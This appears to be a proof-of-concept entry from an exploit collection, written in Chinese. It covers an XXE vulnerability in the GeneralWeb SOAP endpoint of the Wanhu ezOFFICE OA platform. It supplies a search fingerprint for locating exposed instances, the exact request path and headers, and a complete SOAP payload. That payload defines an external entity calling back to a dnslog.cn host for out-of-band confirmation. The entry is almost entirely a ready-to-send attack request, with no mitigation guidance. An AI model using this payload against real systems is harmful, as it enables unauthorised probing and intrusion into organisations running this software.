# 万户OA系统接口GeneralWeb存在XXE漏洞

- **系统**：万户OA系统接口　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`app="万户ezOFFICE协同管理平台"`
- **请求**：`POST /defaultroot/xfservices/./GeneralWeb HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 457`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gen="http://com.whir.service/GeneralWeb">
<soapenv:Body>
<gen:OAManager>
<gen:input>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY x SYSTEM "http://123.6x9ryk.dnslog.cn"&gt;]&gt;
&lt;root&gt;&amp;x;&lt;/root&gt;
</gen:input>
</gen:OAManager>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　—